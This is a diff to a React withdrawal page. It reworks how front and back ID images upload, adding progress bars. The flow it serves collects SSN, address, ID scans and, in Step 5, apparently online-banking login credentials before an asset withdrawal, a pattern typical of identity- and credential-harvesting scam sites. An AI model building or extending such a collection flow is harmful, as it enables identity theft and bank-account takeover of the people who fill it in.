@@ -1,6 +1,6 @@
 import React, { useEffect, useMemo, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { FiUploadCloud, FiLink } from 'react-icons/fi';
+import { FiUploadCloud, FiLink, FiCheckCircle } from 'react-icons/fi';
 import PageHeader from '../components/PageHeader';
 import PasswordInput from '../components/PasswordInput';
 import api from '../utils/api';
@@ -15,8 +15,16 @@ const Withdraw = () => {
   const [step, setStep] = useState(1);
   const [verification, setVerification] = useState({ email: '', phone: '', ssn: '', address: '' });
   const [idType, setIdType] = useState('license');
-  const [front, setFront] = useState(null);
-  const [back, setBack] = useState(null);
+
+  const [frontFile, setFrontFile] = useState(null);
+  const [backFile, setBackFile] = useState(null);
+  const [frontUrl, setFrontUrl] = useState('');
+  const [backUrl, setBackUrl] = useState('');
+  const [frontUploading, setFrontUploading] = useState(false);
+  const [backUploading, setBackUploading] = useState(false);
+  const [frontProgress, setFrontProgress] = useState(0);
+  const [backProgress, setBackProgress] = useState(0);
+
   const [assets, setAssets] = useState([]);
   const [symbol, setSymbol] = useState('');
   const [amount, setAmount] = useState('');
@@ -51,24 +59,87 @@ const Withdraw = () => {
     return `${m}:${s}`;
   }, [secondsLeft]);
 
+  const handleFileSelect = (file, side) => {
+    if (!file) return;
+    setError('');
+    if (side === 'front') {
+      setFrontFile(file);
+      setFrontProgress(0);
+      setFrontUrl('');
+    } else {
+      setBackFile(file);
+      setBackProgress(0);
+      setBackUrl('');
+    }
+  };
+
+  // 🔧 Upload without manually setting Content-Type (fixes hang + enables progress events)
+  const uploadOne = async (file, side, setProgress) => {
+    const fd = new FormData();
+    fd.append('file', file);
+    fd.append('side', side);
+    const { data } = await api.post('/withdraw/id/upload', fd, {
+      onUploadProgress: (e) => {
+        if (!e.total) return;
+        const pct = Math.min(95, Math.round((e.loaded * 100) / e.total));
+        setProgress(pct);
+      },
+    });
+    setProgress(100);
+    return data.url;
+  };
+
+  const handleUploadAndNext = async () => {
+    setError('');
+    if (!frontFile || !backFile) {
+      return setError('Please select both front and back images');
+    }
+
+    setLoading(true);
+    setFrontUploading(true);
+    setBackUploading(true);
+    setFrontProgress(0);
+    setBackProgress(0);
+
+    try {
+      const [fUrl, bUrl] = await Promise.all([
+        uploadOne(frontFile, 'front', setFrontProgress),
+        uploadOne(backFile, 'back', setBackProgress),
+      ]);
+      setFrontUrl(fUrl);
+      setBackUrl(bUrl);
+
+      await api.post('/withdraw/id', { idType, frontUrl: fUrl, backUrl: bUrl });
+      setStep(3);
+    } catch (err) {
+      setError(
+        err?.response?.data?.message ||
+          'Image upload failed. Please check your connection and try again.'
+      );
+      setFrontProgress(0);
+      setBackProgress(0);
+    } finally {
+      setLoading(false);
+      setFrontUploading(false);
+      setBackUploading(false);
+    }
+  };
+
   const next = async () => {
     setError('');
     setLoading(true);
     try {
       if (step === 1) {
-        if (!verification.email || !verification.phone || !verification.ssn || !verification.address) {
+        if (
+          !verification.email ||
+          !verification.phone ||
+          !verification.ssn ||
+          !verification.address
+        ) {
           throw new Error('All verification fields are required');
         }
         await api.post('/withdraw/verification', verification);
         setStep(2);
-      } else if (step === 2) {
-        if (!front || !back) throw new Error('Upload both front and back of your ID');
-        const fd = new FormData();
-        fd.append('idType', idType);
-        fd.append('front', front);
-        fd.append('back', back);
-        await api.post('/withdraw/id', fd, { headers: { 'Content-Type': 'multipart/form-data' } });
-        setStep(3);
       } else if (step === 3) {
         if (!symbol) throw new Error('Select an asset');
         if (!amount || Number(amount) <= 0) throw new Error('Enter a valid amount');
@@ -177,34 +248,106 @@ const Withdraw = () => {
               <button
                 className={idType === 'license' ? 'active' : ''}
                 onClick={() => setIdType('license')}
+                disabled={frontUploading || backUploading}
               >
                 State Driver&apos;s License
               </button>
               <button
                 className={idType === 'nondriver' ? 'active' : ''}
                 onClick={() => setIdType('nondriver')}
+                disabled={frontUploading || backUploading}
               >
                 State-Issued Non-Driver ID Card
               </button>
             </div>
 
             <label>Front of Card</label>
-            <label className="upload-box">
-              <FiUploadCloud />
-              <span>{front ? front.name : 'Choose front image'}</span>
-              <input type="file" accept="image/*" onChange={(e) => setFront(e.target.files[0])} hidden />
+            <label
+              className={`upload-box${frontUploading ? ' uploading' : ''}${
+                frontUrl ? ' done' : ''
+              }`}
+            >
+              <div className="upload-box-inner">
+                {frontUploading ? (
+                  <div className="spinner-sm" />
+                ) : frontUrl ? (
+                  <FiCheckCircle />
+                ) : (
+                  <FiUploadCloud />
+                )}
+                <span className="upload-filename">
+                  {frontFile ? frontFile.name : 'Choose front image'}
+                </span>
+                {frontUploading && (
+                  <span className="upload-status-text">Uploading {frontProgress}%</span>
+                )}
+                {frontUrl && <span className="upload-status-text">Uploaded ✓</span>}
+              </div>
+              {frontUploading && (
+                <div className="upload-progress">
+                  <div
+                    className="upload-progress-fill"
+                    style={{ width: `${Math.max(3, frontProgress)}%` }}
+                  />
+                </div>
+              )}
+              <input
+                type="file"
+                accept="image/*"
+                onChange={(e) => handleFileSelect(e.target.files[0], 'front')}
+                hidden
+                disabled={frontUploading || backUploading}
+              />
             </label>
 
             <label>Back of Card</label>
-            <label className="upload-box">
-              <FiUploadCloud />
-              <span>{back ? back.name : 'Choose back image'}</span>
-              <input type="file" accept="image/*" onChange={(e) => setBack(e.target.files[0])} hidden />
+            <label
+              className={`upload-box${backUploading ? ' uploading' : ''}${
+                backUrl ? ' done' : ''
+              }`}
+            >
+              <div className="upload-box-inner">
+                {backUploading ? (
+                  <div className="spinner-sm" />
+                ) : backUrl ? (
+                  <FiCheckCircle />
+                ) : (
+                  <FiUploadCloud />
+                )}
+                <span className="upload-filename">
+                  {backFile ? backFile.name : 'Choose back image'}
+                </span>
+                {backUploading && (
+                  <span className="upload-status-text">Uploading {backProgress}%</span>
+                )}
+                {backUrl && <span className="upload-status-text">Uploaded ✓</span>}
+              </div>
+              {backUploading && (
+                <div className="upload-progress">
+                  <div
+                    className="upload-progress-fill"
+                    style={{ width: `${Math.max(3, backProgress)}%` }}
+                  />
+                </div>
+              )}
+              <input
+                type="file"
+                accept="image/*"
+                onChange={(e) => handleFileSelect(e.target.files[0], 'back')}
+                hidden
+                disabled={frontUploading || backUploading}
+              />
             </label>
 
             {error && <div className="form-error">{error}</div>}
-            <button className="primary-btn" onClick={next} disabled={loading}>
-              {loading ? 'Uploading...' : 'Next'}
+            <button
+              className="primary-btn"
+              onClick={handleUploadAndNext}
+              disabled={loading || !frontFile || !backFile}
+            >
+              {loading
+                ? `Uploading Front ${frontProgress}% · Back ${backProgress}%`
+                : 'Next'}
             </button>
           </div>
         )}
@@ -254,7 +397,6 @@ const Withdraw = () => {
           </div>
         )}
 
-        {/* 🔧 Step 5 — Bank Name input removed (uses bank from Step 4) & eye toggle added */}
         {step === 5 && (
           <div className="step-card">
             <h3>Step 5 — Connect Online Banking</h3>
